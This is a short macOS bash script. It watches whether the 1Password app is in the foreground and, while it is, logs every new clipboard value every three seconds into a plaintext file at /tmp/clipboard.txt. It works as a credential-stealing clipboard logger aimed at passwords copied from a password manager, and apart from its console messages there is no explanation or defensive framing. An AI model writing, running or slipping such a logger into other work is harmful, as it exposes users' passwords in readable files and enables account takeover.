#/bin/bash

passwordManager="1Password"
clipboardLogPath="/tmp/clipboard.txt"

echo -e "The password manager application is set to $passwordManager\n"
echo ""

getFrontApp () {
    echo $(lsappinfo info $(lsappinfo front) name | cut -f2 -d"=" | tr -d '"') 
}

frontApp=$(getFrontApp)

checkStatusChange () {
    oldFrontApp=$frontApp
    newFrontApp=$(getFrontApp)

    if [[ $oldFrontApp == $newFrontApp ]]; then
        return 1
    else
        return 0
    fi
}


checkFrontApp () {
    frontApp=$(getFrontApp)

    if [[ $frontApp == *"$passwordManager"* ]]; then
        return 0
    else
        return 1
    fi
}

while true; do
    if checkStatusChange; then
        if checkFrontApp; then
            echo "$passwordManager is in the foreground!"
            echo "Logging clipboard to /tmp/clipboard.txt"
        else
            echo "$passwordManager is not in the foreground :/"
        fi
    fi

    if checkFrontApp; then
        if [[ "$(pbpaste)" != "$(tail -n1 /tmp/clipboard.txt)" ]];  then
            echo "Adding '$(pbpaste)'"
            echo $(pbpaste) >> /tmp/clipboard.txt
        fi
    fi
    sleep 3 
done
